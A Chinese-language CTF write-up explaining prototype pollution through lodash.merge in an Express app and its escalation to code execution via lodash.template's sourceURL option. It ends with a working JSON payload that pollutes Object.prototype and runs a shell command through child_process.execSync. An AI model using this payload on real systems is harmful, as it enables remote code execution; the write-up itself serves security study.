原型链污染出现的常见情况：对象merge和对象clone

merge:拼接（合并），以一个对象为目标，将其与另一个对象合并

clone:克隆（拷贝），可以看作是一种特殊的合并，以一个空对象为目标，与一个非空对象合并，应该算是深拷贝

所以原型链污染出现的重点就是merge，不止在javascript中是这样

下面是一个简单的merge函数：

```javascript
function merge(target, source) {
    for (let key in source) {
        if (key in source && key in target) {
            merge(target[key], source[key])
        } else {
            target[key] = source[key]
        }
    }
}
```

这意味着如果设法令key=__proto__并成功被merge解析，那么就可以利用原型链污染改变类的内容实现任意代码执行

这道题的主要代码如下：

```javascript
// ...
const lodash = require('lodash')
// ...

app.engine('ejs', function (filePath, options, callback) { 
// define the template engine
    fs.readFile(filePath, (err, content) => {
        if (err) return callback(new Error(err))
        let compiled = lodash.template(content)
        let rendered = compiled({...options})

        return callback(null, rendered)
    })
})
//...
app.all('/', (req, res) => {
    let data = req.session.data || {language: [], category: []}
    if (req.method == 'POST') {
        data = lodash.merge(data, req.body)
        req.session.data = data
    }

    res.render('index', {
        language: data.language, 
        category: data.category
    })
})

```

整个应用的逻辑就是将输入点里的提交内容用merge合并，再保存到session里。在污染原型链后，我们相当于可以给Object对象插入任意属性，这个插入的属性反应在最后的lodash.template中。

lodash.template的具体内容如下：[https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165](https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165)

跟踪到sourceURL，具体内容如下：

```javascript
  var sourceURL = 'sourceURL' in options ? '//# sourceURL=' + options.sourceURL + '\n' : '';
  var result = attempt(function() {
    return Function(importsKeys, sourceURL + 'return ' + source)
    .apply(undefined, importsValues);
  });
```

 options是一个对象，sourceURL是通过下面的语句赋值的，options默认没有sourceURL属性，所以sourceURL默认也是为空。如果<font style="color:rgb(77, 77, 77);">给所有Object对象中都插入一个</font>`<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">sourceURL</font>`<font style="color:rgb(77, 77, 77);">属性，这个</font>`<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">sourceURL</font>`<font style="color:rgb(77, 77, 77);">被拼接进</font>`<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">new Function</font>`<font style="color:rgb(77, 77, 77);">的第二个参数中，就能造成任意代码执行漏洞。</font>

nodejs下有一个模块为process，child_process是它的子模块，而execSync是子模块的方法，里面的参数命令是根据你是windows还是Linux决定的，即在全局下拿到process模块下child_process子模块的execSync方法。因为我们的格式是sourceURL + ‘return ’ + source，而且return格式不可能为xxx return，而是为return xxx，Unicode编码’\u000a’解析后为换行符，//而这为注释，总的来说就是将sourceURL + 'return ’ + source中的return换行后注释。

所以payload为

```javascript
{"__proto__":{"sourceURL":"\u000areturn ()=>{for (var a in {}) {delete Object.prototype[a];}return global.process.mainModule.constructor._load('child_process').execSync('whoami')}\u000a//"}}
```

